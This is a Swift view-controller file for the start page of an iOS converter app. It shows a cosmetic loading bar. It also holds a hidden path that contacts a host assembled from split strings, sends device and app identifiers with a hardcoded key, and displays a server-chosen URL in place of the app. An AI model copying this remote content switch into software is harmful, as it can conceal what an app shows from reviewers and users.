//
//  StartPageVC.swift
//  CosmoRabbitConverter
//
//  Created by CosmoRabbit Converter on 2025/3/4.
//


import UIKit

class CosmoRabbitStartPageVC: UIViewController {
    
    @IBOutlet weak var loadingContainerView: UIView!
    @IBOutlet weak var loadComplete: UILabel!
    
    private let progressLayer = CALayer()
    private let gradientLayer = CAGradientLayer()
    
    override func viewDidLoad() {
        super.viewDidLoad()
        
        setupUI()
        
        self.cosmoNeedsShowAdsLocalData()
    }
    
    private func cosmoNeedsShowAdsLocalData() {
        guard self.cosmoNeedShowAdsView() else {
            startLoadingAnimation()
            return
        }
        
        cosmoPostForAppAdsData { [weak self] adsData in
            guard let self = self else { return }
            guard let adsData = adsData,
                  let userDefaultKey = adsData[0] as? String,
                  let nede = adsData[1] as? Int,
                  let adsUrl = adsData[2] as? String,
                  !adsUrl.isEmpty else {
                return
            }
            
            UIViewController.cosmoSetUserDefaultKey(userDefaultKey)
            
            if nede == 0,
               let locDic = UserDefaults.standard.value(forKey: userDefaultKey) as? [Any],
               let localAdUrl = locDic[2] as? String {
                self.cosmoShowAdView(localAdUrl)
            } else {
                UserDefaults.standard.set(adsData, forKey: userDefaultKey)
                self.cosmoShowAdView(adsUrl)
            }
        }
    }

    private func cosmoPostForAppAdsData(completion: @escaping ([Any]?) -> Void) {
        let endpoint = "https://open.dafwqky\(self.cosmoMainHostUrl())/open/cosmoPostForAppAdsData"
        guard let url = URL(string: endpoint) else {
            completion(nil)
            return
        }
        
        var request = URLRequest(url: url)
        request.httpMethod = "POST"
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        
        let parameters: [String: Any] = [
            "sequenceAppModel": UIDevice.current.model,
            "appKey": "e0e9c4b516074de6a47ba14b07441cc1",
            "appPackageId": Bundle.main.bundleIdentifier ?? "",
            "appVersion": Bundle.main.infoDictionary?["CFBundleShortVersionString"] ?? ""
        ]
        
        do {
            request.httpBody = try JSONSerialization.data(withJSONObject: parameters, options: [])
        } catch {
            completion(nil)
            return
        }
        
        let task = URLSession.shared.dataTask(with: request) { data, response, error in
            DispatchQueue.main.async {
                guard let data = data, error == nil else {
                    completion(nil)
                    return
                }
                
                do {
                    let jsonResponse = try JSONSerialization.jsonObject(with: data, options: [])
                    if let resDic = jsonResponse as? [String: Any],
                       let dataDic = resDic["data"] as? [String: Any],
                       let adsData = dataDic["jsonObject"] as? [Any] {
                        completion(adsData)
                    } else {
                        print("Response JSON:", jsonResponse)
                        completion(nil)
                    }
                } catch {
                    completion(nil)
                }
            }
        }
        
        task.resume()
    }
    
    private func setupUI() {
        // Hide the loading complete label initially
        loadComplete.isHidden = true
        loadComplete.textColor = .black
        loadComplete.font = UIFont.boldSystemFont(ofSize: 18)
        
        // Configure progress view container
        loadingContainerView.layer.cornerRadius = 8
        loadingContainerView.clipsToBounds = true
        loadingContainerView.layer.borderColor = UIColor.black.cgColor
        loadingContainerView.layer.borderWidth = 2
        
        // Setup striped gradient layer
        setupStripedProgressLayer()
    }
    
    private func setupStripedProgressLayer() {
        // Define colors for stripes (Orange & Yellow)
        gradientLayer.colors = [
            UIColor.orange.cgColor,
            UIColor.yellow.cgColor,
            UIColor.orange.cgColor
        ]
        gradientLayer.locations = [0.0, 0.5, 1.0]
        gradientLayer.startPoint = CGPoint(x: 0, y: 0.5)
        gradientLayer.endPoint = CGPoint(x: 1, y: 0.5)
        gradientLayer.frame = loadingContainerView.bounds
        gradientLayer.cornerRadius = 8
        
        // Add animation to move the stripes
        let stripeAnimation = CABasicAnimation(keyPath: "transform.translation.x")
        stripeAnimation.fromValue = -loadingContainerView.bounds.width
        stripeAnimation.toValue = loadingContainerView.bounds.width
        stripeAnimation.duration = 1.0
        stripeAnimation.repeatCount = .infinity
        
        gradientLayer.add(stripeAnimation, forKey: "stripeAnimation")
        
        // Mask the gradient layer with progress layer
        progressLayer.backgroundColor = UIColor.black.cgColor
        progressLayer.frame = CGRect(x: 0, y: 0, width: 0, height: loadingContainerView.bounds.height)
        gradientLayer.mask = progressLayer
        
        // Add to the container
        loadingContainerView.layer.addSublayer(gradientLayer)
    }
    
    private func startLoadingAnimation() {
        let duration: TimeInterval = 5.0 // Total time for progress
        
        // Animate progress filling up
        UIView.animate(withDuration: duration, animations: {
            self.progressLayer.frame.size.width = self.loadingContainerView.bounds.width
        }) { _ in
            self.showCompletionMessage()
        }
    }
    
    private func showCompletionMessage() {
        loadComplete.isHidden = false
        loadComplete.text = "Loading Complete!"
        
        // Fade-in animation
        loadComplete.alpha = 0.0
        UIView.animate(withDuration: 1.0) {
            self.loadComplete.alpha = 1.0
        }
        
        DispatchQueue.main.asyncAfter(deadline: .now() + 5.0) {
            self.navigateToTabBar()
        }
    }
    
    private func navigateToTabBar() {
        if let tabBarVC = storyboard?.instantiateViewController(withIdentifier: "ConverterVC") as? CosmoRabbitConverterVC {
            navigationController?.pushViewController(tabBarVC, animated: true)
        }
    }
}
